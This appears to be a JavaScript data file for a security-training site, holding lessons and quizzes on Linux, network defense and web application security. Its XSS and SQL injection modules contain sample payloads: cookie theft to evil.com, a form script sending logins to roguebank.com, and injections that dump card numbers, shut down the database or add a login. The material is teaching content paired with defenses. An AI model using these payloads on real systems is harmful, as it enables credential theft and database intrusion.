export const COURSES = [
    {
        id: "linux-basics",
        title: "Linux for Hackers",
        description: "Master the command line. From basic navigation to bash scripting and system administration.",
        level: "Beginner",
        duration: "4 hours",
        modules: [
            {
                id: "intro",
                title: "The File System",
                content: `
### Understanding the Linux File Hierarchy

Unlike Windows, Linux doesn't use drive letters (C:, D:). Everything starts from the root directory \`/\`.

**Key Directories:**
- \`/bin\`: Essential user binaries (ls, cp, mv)
- \`/etc\`: Configuration files for the system
- \`/home\`: User home directories
- \`/var\`: Variable files like logs and databases
- \`/tmp\`: Temporary files (cleared on reboot)
- \`/opt\`: Optional/third-party software
- \`/usr\`: User programs and data

### Basic Navigation Commands

- \`pwd\`: Print Working Directory - shows where you are
- \`cd\`: Change Directory - move between folders
- \`ls\`: List files and directories
- \`ls -la\`: List all files with details (including hidden)
- \`tree\`: Visual directory structure

### Tips for Beginners

Always use \`tab\` for auto-completion. It saves time and prevents typos. Use \`cd ..\` to go up one directory and \`cd ~\` to go to your home directory.
                `,
                quiz: [
                    {
                        id: "q1",
                        question: "Which directory contains system configuration files?",
                        options: ["/bin", "/etc", "/home", "/dev"],
                        answer: 1
                    },
                    {
                        id: "q2",
                        question: "Which command shows your current location in the file system?",
                        options: ["ls", "cd", "pwd", "whoami"],
                        answer: 2
                    }
                ]
            },
            {
                id: "permissions",
                title: "File Permissions",
                content: `
### Understanding Linux Permissions

Linux permissions control who can **Read (r)**, **Write (w)**, and **Execute (x)** a file.

**Permission Groups:**
1. **Owner (u)** - The user who created the file
2. **Group (g)** - Users in the file's group
3. **Others (o)** - Everyone else

### Reading Permission Strings

When you run \`ls -l\`, you see permissions like: \`-rwxr-xr--\`

- First character: file type (\`-\` = file, \`d\` = directory)
- Characters 2-4: Owner permissions (rwx)
- Characters 5-7: Group permissions (r-x)
- Characters 8-10: Others permissions (r--)

### Numeric (Octal) Mode

- Read = 4
- Write = 2
- Execute = 1

**Common Permission Sets:**
- \`755\`: rwxr-xr-x (standard for scripts)
- \`644\`: rw-r--r-- (standard for files)
- \`700\`: rwx------ (private execution)
- \`600\`: rw------- (private files)

### Chmod Examples

\`chmod 755 script.sh\` - Make script executable
\`chmod +x script.sh\` - Add execute permission
\`chmod u+w file.txt\` - Add write for owner
                `,
                quiz: [
                    {
                        id: "q3",
                        question: "What numeric value represents 'Read' permission?",
                        options: ["1", "2", "4", "7"],
                        answer: 2
                    },
                    {
                        id: "q4",
                        question: "What does 'chmod 600 file.txt' do?",
                        options: [
                            "Makes file executable by everyone",
                            "Gives read/write to owner only",
                            "Deletes the file",
                            "Changes file ownership"
                        ],
                        answer: 1
                    }
                ]
            },
            {
                id: "text-processing",
                title: "Text Processing",
                content: `
### Essential Text Commands

**Viewing Files:**
- \`cat file.txt\`: Display entire file
- \`head -n 10 file.txt\`: First 10 lines
- \`tail -n 10 file.txt\`: Last 10 lines
- \`tail -f log.txt\`: Follow file updates (great for logs)
- \`less file.txt\`: Paginated viewer

### Searching with Grep

\`grep\` is your best friend for finding text in files.

**Basic Usage:**
- \`grep "error" log.txt\`: Find lines containing "error"
- \`grep -i "Error" log.txt\`: Case-insensitive search
- \`grep -r "password" /etc/\`: Recursive search in directory
- \`grep -n "TODO" *.py\`: Show line numbers

**Regular Expressions:**
- \`grep "^Start" file.txt\`: Lines starting with "Start"
- \`grep "end$" file.txt\`: Lines ending with "end"
- \`grep -E "[0-9]+" file.txt\`: Extended regex (numbers)

### Piping Commands

The pipe operator \`|\` sends output from one command to another:

- \`cat access.log | grep "404"\`: Find 404 errors
- \`ps aux | grep nginx\`: Find nginx processes
- \`cat file.txt | wc -l\`: Count lines
                `,
                quiz: [
                    {
                        id: "q5",
                        question: "Which command follows a file in real-time?",
                        options: ["cat", "head", "tail -f", "less"],
                        answer: 2
                    },
                    {
                        id: "q6",
                        question: "What does the pipe operator | do?",
                        options: [
                            "Writes output to a file",
                            "Sends output to another command",
                            "Runs commands in parallel",
                            "Copies files"
                        ],
                        answer: 1
                    }
                ]
            },
            {
                id: "user-management",
                title: "User Management",
                content: `
### User Administration

**Creating Users:**
- \`useradd username\`: Create new user
- \`useradd -m -s /bin/bash newuser\`: Create with home dir and bash shell
- \`passwd username\`: Set/change password

**User Information:**
- \`whoami\`: Current username
- \`id\`: Current user ID and groups
- \`who\`: Who is logged in
- \`w\`: Detailed login info

### Groups

- \`groupadd developers\`: Create group
- \`usermod -aG developers john\`: Add john to developers group
- \`groups username\`: Show user's groups

### The Sudo System

\`sudo\` allows permitted users to run commands as root.

**Key Files:**
- \`/etc/passwd\`: User accounts
- \`/etc/shadow\`: Encrypted passwords
- \`/etc/group\`: Group definitions
- \`/etc/sudoers\`: Sudo permissions (edit with visudo)

### Security Best Practices

- Use strong passwords
- Disable root login via SSH
- Use sudo instead of su
- Regularly audit user accounts
- Remove unnecessary users
                `,
                quiz: [
                    {
                        id: "q7",
                        question: "Which file contains encrypted passwords?",
                        options: ["/etc/passwd", "/etc/shadow", "/etc/users", "/etc/security"],
                        answer: 1
                    }
                ]
            }
        ]
    },
    {
        id: "network-defense",
        title: "Network Defense Essentials",
        description: "Secure networks, configure firewalls, and detect intrusions. Master TCP/IP and network security.",
        level: "Intermediate",
        duration: "6 hours",
        modules: [
            {
                id: "protocols",
                title: "TCP/IP & Ports",
                content: `
### The Language of the Internet

**TCP (Transmission Control Protocol)**
- Connection-oriented
- Reliable delivery with acknowledgments
- Used for: HTTP, SSH, FTP, Email

**UDP (User Datagram Protocol)**
- Connectionless
- Faster but no guaranteed delivery
- Used for: DNS, VoIP, Streaming, Gaming

### The TCP Handshake

1. **SYN**: Client initiates connection
2. **SYN-ACK**: Server acknowledges
3. **ACK**: Client confirms, connection established

### Common Ports to Know

| Port | Service | Protocol |
|------|---------|----------|
| 21 | FTP | TCP |
| 22 | SSH | TCP |
| 23 | Telnet | TCP |
| 25 | SMTP | TCP |
| 53 | DNS | UDP/TCP |
| 80 | HTTP | TCP |
| 443 | HTTPS | TCP |
| 3389 | RDP | TCP |
| 3306 | MySQL | TCP |

### Port States

- **Open**: Service is listening
- **Closed**: No service, but reachable
- **Filtered**: Firewall blocking access
                `,
                quiz: [
                    {
                        id: "q4",
                        question: "Which port is commonly used for SSH?",
                        options: ["21", "22", "80", "443"],
                        answer: 1
                    },
                    {
                        id: "q5",
                        question: "Which protocol is connectionless?",
                        options: ["TCP", "UDP", "HTTP", "SSH"],
                        answer: 1
                    }
                ]
            },
            {
                id: "firewalls",
                title: "Firewall Configuration",
                content: `
### Understanding Firewalls

A firewall is your first line of defense, controlling traffic based on rules.

**Types of Firewalls:**
- **Packet Filter**: Examines individual packets
- **Stateful**: Tracks connection state
- **Application Layer**: Inspects content (WAF)
- **Next-Gen (NGFW)**: Deep packet inspection + IDS

### iptables Basics

Linux uses iptables (or nftables) for packet filtering.

**Chains:**
- **INPUT**: Incoming traffic to this host
- **OUTPUT**: Outgoing traffic from this host
- **FORWARD**: Traffic passing through

**Common Commands:**
\`iptables -L\`: List all rules
\`iptables -A INPUT -p tcp --dport 22 -j ACCEPT\`: Allow SSH
\`iptables -A INPUT -p tcp --dport 80 -j ACCEPT\`: Allow HTTP
\`iptables -A INPUT -j DROP\`: Drop all other incoming

### UFW (Uncomplicated Firewall)

A simpler interface for iptables on Ubuntu:

\`ufw enable\`: Enable firewall
\`ufw allow 22/tcp\`: Allow SSH
\`ufw allow from 192.168.1.0/24\`: Allow subnet
\`ufw status\`: Check status
\`ufw deny 23\`: Block telnet

### Best Practices

- Default deny incoming, allow outgoing
- Only open necessary ports
- Log dropped packets for analysis
- Regularly audit firewall rules
                `,
                quiz: [
                    {
                        id: "q6",
                        question: "Which iptables chain handles incoming traffic?",
                        options: ["OUTPUT", "FORWARD", "INPUT", "ACCEPT"],
                        answer: 2
                    },
                    {
                        id: "q7",
                        question: "What command enables UFW?",
                        options: ["ufw start", "ufw enable", "ufw on", "ufw activate"],
                        answer: 1
                    }
                ]
            },
            {
                id: "network-analysis",
                title: "Network Analysis",
                content: `
### Network Troubleshooting Tools

**Connectivity Testing:**
- \`ping 8.8.8.8\`: Test if host is reachable
- \`traceroute google.com\`: Map network path
- \`mtr google.com\`: Combined ping + traceroute

**DNS Tools:**
- \`nslookup domain.com\`: DNS lookup
- \`dig domain.com\`: Detailed DNS query
- \`host domain.com\`: Simple DNS lookup

**Network Information:**
- \`ifconfig\` or \`ip addr\`: Network interfaces
- \`netstat -tulpn\`: Listening ports
- \`ss -tulpn\`: Modern netstat replacement
- \`arp -a\`: ARP table (local network devices)

### Packet Capture with tcpdump

\`tcpdump\` captures network traffic for analysis:

\`tcpdump -i eth0\`: Capture on interface
\`tcpdump -i any port 80\`: Capture HTTP traffic
\`tcpdump -w capture.pcap\`: Save to file
\`tcpdump -r capture.pcap\`: Read from file

### Wireshark Tips

- Filter by protocol: \`http\`, \`dns\`, \`tcp\`
- Filter by IP: \`ip.addr == 192.168.1.1\`
- Filter by port: \`tcp.port == 443\`
- Follow TCP Stream for conversations
                `,
                quiz: [
                    {
                        id: "q8",
                        question: "Which command shows listening ports on Linux?",
                        options: ["ps aux", "netstat -tulpn", "ls -la", "cat /etc/ports"],
                        answer: 1
                    }
                ]
            }
        ]
    },
    {
        id: "web-security",
        title: "Web Application Security",
        description: "Learn OWASP Top 10 vulnerabilities, secure coding practices, and web app testing methodologies.",
        level: "Intermediate",
        duration: "8 hours",
        modules: [
            {
                id: "owasp-intro",
                title: "OWASP Top 10 Overview",
                content: `
### What is OWASP?

The **Open Web Application Security Project** is a nonprofit foundation that produces security resources, tools, and documentation.

### OWASP Top 10 (2021)

1. **Broken Access Control** - Users can access unauthorized resources
2. **Cryptographic Failures** - Weak encryption or data exposure
3. **Injection** - SQL, NoSQL, OS command injection
4. **Insecure Design** - Flaws in architecture
5. **Security Misconfiguration** - Default configs, open S3 buckets
6. **Vulnerable Components** - Outdated libraries
7. **Identification & Authentication Failures** - Weak auth
8. **Software & Data Integrity Failures** - Untrusted updates
9. **Security Logging Failures** - No or poor logging
10. **Server-Side Request Forgery (SSRF)** - Fetching arbitrary URLs

### Why It Matters

Understanding these vulnerabilities helps you:
- Build secure applications from the start
- Identify weaknesses in existing applications
- Speak the common language of web security
- Prepare for security certifications
                `,
                quiz: [
                    {
                        id: "q1",
                        question: "What does OWASP stand for?",
                        options: [
                            "Open Web Application Security Project",
                            "Online Web App Safety Protocol",
                            "Open World Application Safety Project",
                            "Organized Web Attack Security Prevention"
                        ],
                        answer: 0
                    },
                    {
                        id: "q2",
                        question: "Which vulnerability is #1 in OWASP Top 10 2021?",
                        options: ["SQL Injection", "XSS", "Broken Access Control", "CSRF"],
                        answer: 2
                    }
                ]
            },
            {
                id: "sql-injection",
                title: "SQL Injection",
                content: `
### What is SQL Injection?

SQL Injection occurs when user input is directly concatenated into SQL queries, allowing attackers to manipulate the query.

### Vulnerable Code Example

\`\`\`
query = "SELECT * FROM users WHERE username='" + username + "'"
\`\`\`

If username is: \`admin' OR '1'='1\`

The query becomes:
\`SELECT * FROM users WHERE username='admin' OR '1'='1'\`

This returns ALL users!

### Types of SQL Injection

**In-band (Classic)**
- Error-based: Uses error messages
- Union-based: Uses UNION to combine queries

**Blind SQLi**
- Boolean-based: Infers data from true/false responses
- Time-based: Uses delays (SLEEP/WAITFOR)

**Out-of-band**
- Uses DNS or HTTP to exfiltrate data

### Prevention

1. **Prepared Statements** (Parameterized Queries)
2. **ORM** (Object Relational Mapping)
3. **Input Validation** (whitelist approach)
4. **Least Privilege** (database permissions)
5. **WAF** (Web Application Firewall)
6. **Regular Security Testing**
                `,
                quiz: [
                    {
                        id: "q3",
                        question: "What is the best defense against SQL Injection?",
                        options: [
                            "Input validation only",
                            "Prepared statements/Parameterized queries",
                            "Encoding output",
                            "Using HTTPS"
                        ],
                        answer: 1
                    },
                    {
                        id: "q4",
                        question: "Which type of SQLi uses time delays?",
                        options: ["Union-based", "Error-based", "Time-based blind", "Out-of-band"],
                        answer: 2
                    }
                ]
            },
            {
                id: "xss",
                title: "Cross-Site Scripting (XSS)",
                content: `
### What is XSS?

Cross-Site Scripting allows attackers to inject malicious scripts into web pages viewed by other users.

### Types of XSS

**Stored (Persistent) XSS**
- Script saved in database
- Affects all users who view the page
- Most dangerous type

**Reflected XSS**
- Script in URL/request
- User must click malicious link
- Common in search fields

**DOM-based XSS**
- Client-side manipulation
- Never hits the server
- Exploits JavaScript frameworks

### Example Payload

\`<script>document.location='http://evil.com/steal?c='+document.cookie</script>\`

This steals cookies and sends them to attacker's server.

### Prevention

1. **Output Encoding** - Encode all untrusted data
2. **Content Security Policy** - Restrict script sources
3. **HTTPOnly Cookies** - Prevent JS access to cookies
4. **Input Validation** - Sanitize user input
5. **Modern Frameworks** - Auto-escape by default (React, Vue, Angular)

### Testing for XSS

Try these in input fields:
- \`<script>alert('XSS')</script>\`
- \`"><img src=x onerror=alert('XSS')>\`
- \`javascript:alert('XSS')\`
                `,
                quiz: [
                    {
                        id: "q5",
                        question: "Which XSS type is stored in the database?",
                        options: ["Reflected", "DOM-based", "Stored/Persistent", "Blind"],
                        answer: 2
                    },
                    {
                        id: "q6",
                        question: "What HTTP header helps prevent XSS?",
                        options: ["X-Frame-Options", "Content-Security-Policy", "X-XSS-Protection", "Strict-Transport-Security"],
                        answer: 1
                    }
                ]
            },
            {
                id: "web-hacking-comprehensive",
                title: "Advanced Web Hacking Techniques",
                content: `
### Web Application Hacking
**Matthew Fisher, SPI Dynamics**
*CNA, MCSA, MCSE, CCSE, CISSP, DISA IATAC SME*

### Topics
*   Comparing web app sec to host / network security
*   Web Application Security Newsmakers
*   Cross-site-scripting (XSS)
*   XSS Proxy
*   SQL Injection
*   SQL Injection "spot" techniques
*   Nasty SQL Injections
*   Blind SQL Injection
*   Testing ACLs with param manip
*   Web Telnet: Something fun for WebDav Uploads
*   Bad Extension source disclosures
*   Managing web app sec
*   Contributing factors to the problem
*   Approach to web app sec programs
*   Why the C&A process fails web app sec

### Web Application Development "Truisms"
*   **Web applications are software.**
*   Multi-billion dollar software companies inadvertently create a massive number of vulnerabilities in their software.
*   Your web developers have a lot less training and resources than software companies do.
*   Development standards emphasize functionality, not security.
*   C-Levels understand other topics better – IDS / IPS, patches.
*   Web App dev not approached as engineering.

### Most Exposed and Least Protected
**Web Application Attacks** bypass the perimeter defenses.
*   **Network Layer**: Exposed Hosts – Insecure Protocols (Protected by Network Attacks)
*   **Operating System**: Known Vulnerabilities - Misconfigurations (Protected by OS Attacks)
*   **Web Server**: Known Vulnerabilities - Misconfigurations (Protected by Known Web Server Attacks)
*   **Web Application**: Code - Content - Implementation (Vulnerable to Web Application Attacks)

### Web Application Vulnerability Characteristics
*   **Affects all Web applications**:
    *   Exists in your own application, not the operating system.
    *   Can exist regardless of the Web server, operating system, configuration, or patch level.
*   **Extremely easy to exploit**:
    *   Sometimes requires nothing more than a Web browser.
    *   Orders of magnitude easier than buffer overflows.
*   **Difficult to deal with at the perimeter**:
    *   SSL Encrypted Traffic, Huge Volume.
    *   Rules granular to each input on each page, change as app changes.

### Cross-Site-Scripting (XSS)
**October 10, 2005: Google Admits to XSS**
Two different Google sites with XSS exposed logged-on session ID and Account information.

**What is it?**
Cross-Site Scripting allowed attackers to inject malicious scripts into web pages viewed by other users.

**Attack Sequence:**
1.  **Original legitimate website**: No login errors, no changes, user works normally.
2.  **Decoded Attack Sequence**: UserID and Password quietly handed off to remote website.
3.  **Malicious Code**: \`<form action="login1.asp" method="post" onsubmit="XSSimage = new Image; XSSimage.src='http://www.roguebank.com/'+ document.forms(1).login.value + ':' + document.forms(1).password.value;">\`

**Vectors:**
*   **Email Vector**: Cross-Site-Scripting attack via emailed vector. Innocent-looking Link has embedded JavaScript.
*   **Embedded Vectors**: Can permanently embed script into web applications (Blogs, Shared Calendars, Web Mail, Message Boards, Web Forums). Proper filtering is exceedingly difficult.
*   **Ajax Script Attacks**: Leverage Ajax programming techniques to provide a "rich, robust" attack. One injection point retrieves remote payload. Series of background requests provide interaction with attacker. Results in remote control or remote "MITM" capability.

**XSS Proxy (by Anton Rager)**
*   Opens an iFrame via an XSS.
*   DOM trusts this new frame – opened by parent site.
*   Frame source is xss-proxy running on attackers machine.
*   Chunks and codes current parent url / HTML into requests to attacker machine via this frame (Attacker sees what victim sees).
*   Receives commands via script from attacker machine (Attacker controls what victim sees/does).
*   Makes XSS considerably more dangerous.

**XSS Defenses:**
*   **Input AND output validation**: Always validate input.
*   Validate/encode output: HTML Encoding helps break XSS.
*   Set your encoding per page – forces browser to use your encoding set.

---

### SQL Injection
**Massively Serious Issue**
Exploits common techniques developers use to query databases. Allows attacker to indirectly access the database by piggybacking their queries onto the web developer's queries.

**Common Database Query:**
\`sSql = "select ErrorMessage from ErrorMessages where ErrorCode = " & Request("ErrorCode")\`
\
Query parameter appended to query:
\`http://127.0.0.1/stats/ShowError.asp?ErrorCode=2\`
\
Result: \`select ErrorMessage from ErrorMessages where ErrorCode = 2\`

**Problem: Unvalidated Input**
Invalid character entered is used in query. Resulting back-end query results in an ODBC error message.
\
Input: \`ErrorCode=2'\`
\
Result: \`Microsoft OLE DB Provider... Unclosed quotation mark...\`

**Piggybacking Queries with UNION**
Values entered into the parameter ErrorCode now have the ability to modify the query itself.
\
Input: \`ErrorCode=9 union select name from sysobjects where xtype='u'\`
\
Query becomes: \`select ErrorMessage from ErrorMessages where ErrorCode = 9 union select name from sysobjects where xtype='u'\`
\
*UNION keyword tells SQL to combine two statements into one.*

**Enumerate all tables in the database:**
*   **Sysobjects**: stores names of tables in database.
*   **Name**: name of table.
*   **Xtype='u'**: all user tables, no system tables.

**A SubQuery Enumerates Columns in the Table:**
Columns are stored in **syscolumns** (Keyed on ID).
\
Query: \`Select name from syscolumns where id=(select id from sysobjects where name='table')\`

**Dealing with Strings:**
If the code surrounds the input with quotes:
\`sSql = "select... where Code = '" & request("ErrorCode") & "'"\`
\
**Escaping from Strings:**
Input: \`ErrorCode=2' union select card_number from%20 bank_cards where '1'='1\`
\
Query becomes: \`select... where Code = 'ErrorCode=2' union select card_number from%20 bank_cards where '1'='1'\`

**More Techniques:**
*   **Trapped in Middle of Query**: Injections are now trapped in middle of query with "unbreakable" where clause.
*   **Breaking Out of Queries**: Use comment characters (\`--\`) at end of query to truncate rest of string query.
*   **SELECT is just the first 1%**: DML (Data Manipulation Language) allows Select, Insert, Update, Delete. DBML (DataBase Manipulation Language) allows Add/Drop/Shrink DBs, Stored Procedures, Server management.
*   **Annoy the DBA**: \`ErrorCode=9; shutdown\` - Seriously **** OFF THE DBA !!
*   **Who is the App Logged In As?**: \`...union select system_user\`
*   **Adding your Own Database Account**: \`...; exec sp_addlogin 'Account', 'Password'\`
*   **Port Scanning the Internal Network**: Just try to initiate a new database connection within the query. \`uid=Thanks;pwd=...;Address=yahoo.com,80;...\` (If it hangs, port is open!)

---

### Blind SQL Injection
**Verbose and Blind**
*   **Verbose**: lack of error handling provides verbose feedback to the browser. Greatly enables the attacks.
*   **Blind**: Input still vulnerable to SQL Injection, but error handling is performed to prevent ODBC errors from displaying in the browser. Still vulnerable, requires more advanced and time consuming technique.

**Caution!**
*   Don't suppress errors without actually fixing core problem. Errors are the symptom, not the problem.
*   Blind conditions result in a larger problem.

**Test for Blind:**
1.  Pass a true statement: \`?ProductType=2 and 1=1\` -> Returns "In Stock"
2.  Pass a false statement: \`?ProductType=1 and 1=0\` -> Returns "Check Another Product"

**20 Questions (Using Boolean Logic):**
*   Problem: Can't print results to screen.
*   Solution: Guess using booleans. "Is the letter greater than 'm'?"
*   Query: \`ProductType=2 and substring((select top 1 name from sysobjects where xtype='u'),1,1) > 'm'\`
*   **Bracket to Reduce Guessing**: Divide in half to reduce to a single character. Not greater than 'm', therefore between 'a' and 'm'.

---

### Parameter Manipulation
*   Different from parameter injections.
*   **Injections** put new data types into the parameter.
*   **Strict parameter manipulation** just changes existing parameters.
*   Usually takes advantage of state mechanisms.

**Examples:**
*   **Victoria's Secret (Nov 2002)**: Changed Order ID parameter in the order status page. Order status page bound to session, but not the parameters. Exposed purchase history.
*   **Gateway Computers (Feb 2004)**: Changing an ID number in a cookie exposed purchase history and credit card details.

---

### Other Attack Vectors & Issues
**Directory Browsing**:
*   Directory browsing reveals file names – no chance at obscuring.
*   Reveals portions of site otherwise unknown.
*   Hacker would normally have to use file-guessing scripts.

**Source Code Disclosure**:
*   Unmapped / Backup Files: Only a few "known" file types get rendered (asp, php, etc). Everything else reveals their source code (e.g., .inc, .bak).

**Contributing Factors:**
*   Developers not taught security.
*   Security not development experts.
*   Low barrier to entry for building web apps.
*   Easy to use languages.
*   Rapid development times.
*   COPY / PASTE code from websites/books.
*   Lack of internal coding standards / guidelines.

**Managing Web App Sec - The Application Lifecycle**:
*   **Design**: Auditors, Dev, Business SMEs.
*   **Development**: Application Developers, Software Architects.
*   **Testing**: QA and Developers.
*   **Production**: Security Operations, Compliance Officers.

**Approach:**
*   Awareness & Education.
*   Coding Practices! Standard Libraries.
*   Assessment Tools and Technology.
*   **Design for Security** – document input types, valid formats, constraints.
*   **Test for Security**: Don't just review code – the implementation counts. Test in QA, also validate Production.

**Input Validation Best Practices**:
*   **WhiteList**: Validate against the known good format (e.g., zip code is [0-9]{5}).
*   **Trim lengths**: Enforce expected lengths.
*   **Use parameterized queries**: All input is treated as a parameter, no chance to modify the base query.
*   **HTML encode output** (for XSS).
*   **Don't BlackList**: You don't know what you don't know. Stripping "bad words" (like 'select' or 'union') is easily bypassed (e.g., 'ununionion').
                `,
                quiz: [
                    {
                        id: "q1",
                        question: "What makes Blind SQL Injection different from Verbose SQL Injection?",
                        options: [
                            "It uses encryption",
                            "It requires a proxy",
                            "It suppresses error messages so attackers must use true/false questions",
                            "It only works on Windows servers"
                        ],
                        answer: 2
                    },
                    {
                        id: "q2",
                        question: "Which of the following is NOT a recommended defense against XSS?",
                        options: [
                            "Input Validation",
                            "Output Encoding",
                            "Using a Blacklist to remove <script> tags",
                            "Setting encoding per page"
                        ],
                        answer: 2
                    },
                    {
                        id: "q3",
                        question: "What is the 'WhiteList' approach to input validation?",
                        options: [
                            "Banning known bad characters",
                            "Allowing only known good formats and characters",
                            "Allowing everything except SQL keywords",
                            "Checking the user's IP address"
                        ],
                        answer: 1
                    },
                    {
                        id: "q4",
                        question: "How does the 'XSS Proxy' tool described make XSS more dangerous?",
                        options: [
                            "It encrypts the payload",
                            "It allows real-time control of the victim's browser from the attacker's machine",
                            "It crashes the server",
                            "It works without JavaScript"
                        ],
                        answer: 1
                    }
                ]
            }
        ]
    }
];
